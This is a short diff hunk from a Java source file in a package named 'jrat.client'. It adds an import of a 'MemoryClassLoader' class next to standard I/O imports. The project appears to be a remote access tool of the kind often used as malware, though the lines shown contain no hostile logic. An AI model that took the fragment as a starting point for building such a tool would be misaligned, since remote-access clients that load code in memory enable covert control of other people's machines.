@@ -1,5 +1,7 @@
 package jrat.client;
 
+import jrat.common.MemoryClassLoader;
+
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
